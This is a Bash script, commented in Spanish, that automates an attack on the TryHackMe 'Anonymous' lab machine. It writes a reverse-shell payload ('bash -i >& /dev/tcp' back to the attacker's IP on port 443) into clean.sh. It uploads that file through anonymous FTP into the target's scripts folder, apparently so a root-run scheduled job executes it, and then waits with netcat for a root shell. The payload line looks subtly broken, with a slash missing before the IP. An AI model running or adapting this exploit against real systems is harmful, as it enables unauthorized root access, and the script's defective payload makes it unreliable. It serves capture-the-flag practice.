#!/bin/bash

# Resolución de máquina Anonymous de THM. Ojo a ifconfig que es para kali en debian no va.rm

# Colores en consola...
color_allo_chillon="\e[93m"
color_rojo="\e[91m"
color_verde="\e[92m"
color_allo="\e[33m"
color_reset="\e[0m"

echo -e "${color_allo}Introduce la IP de la máquina víctima: ${color_reset}"
read -p '' ip_victima

# Vamos a por la interfaz activa...
mi_IP=$(ifconfig enx00e04c6802be | grep 'inet' | awk '{print $2}' | head -n 1)

if [ $? -eq 0 ]; then
    echo -e "${color_verde}[+]${color_reset} Hemos detectado que tu IP es $mi_IP y la IP de la maquina victima es $ip_victima"
else
    echo -e "${color_rojo}[-]${color_reset} Hubo un error en el proceso de capturar tu IP"
    exit 1
fi

sleep 2

# creación del clean.sh
echo -e "${color_verde}[+]${color_reset} Creamos el script llamado clean.sh en el codigo malicioso"

echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp'"$mi_IP"'/443 0>&1' >> clean.sh

test -f clean.sh

if [ $? -eq 0 ]; then
    echo -e "${color_verde}[+]${color_reset} Se ha creado correctamente el archivo clean.sh"
else
    echo -e "${color_rojo}[-]${color_reset} Hubo un error al crear el archivo clean.sh"
    exit 1
fi

## Subida via FTP

# Configuracion
servidor=$ip_victima
usuario="anonymous"

# Ruta y nombre del archivo local
archivo_local="clean.sh"

# Ruta y nombre del archivo remoto en la carpeta /scripts
archivo_remoto="scripts/clean.sh"

# Comando FTP para subir el archivo
echo -e "\n" | curl -u $usuario -T "$archivo_local" ftp://$servidor/$archivo_remoto

if [ $? -eq 0 ]; then
    echo -e "${color_verde}[+]${color_reset} Se ha subido correctamente el archivo clean.sh"
else
    echo -e "${color_rojo}[-]${color_reset} Hubo un error al subir el archivo clean.sh"
    exit 1
fi

echo -e "${color_allo_chillon}Nos ponemos en escucha con NetCat, en menos de 5 mins. recibiremos la reverse shell y el acceso root..."

nc -nlvp 443